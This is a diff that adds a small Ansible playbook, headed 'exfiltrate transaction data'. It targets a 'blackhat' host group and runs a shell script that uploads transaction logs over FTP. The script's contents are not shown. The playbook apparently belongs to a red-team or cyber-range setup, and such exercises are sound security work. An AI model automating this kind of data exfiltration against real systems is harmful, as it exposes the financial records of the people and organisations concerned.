@@ -1,0 +1,9 @@
+---
+#
+# exfiltrate transaction data
+#
+- name: upload transaction logs to ftp
+  hosts: blackhat
+  tasks:
+    - name: upload transaction logs to ftp
+      command: ./ftp_transactions.sh
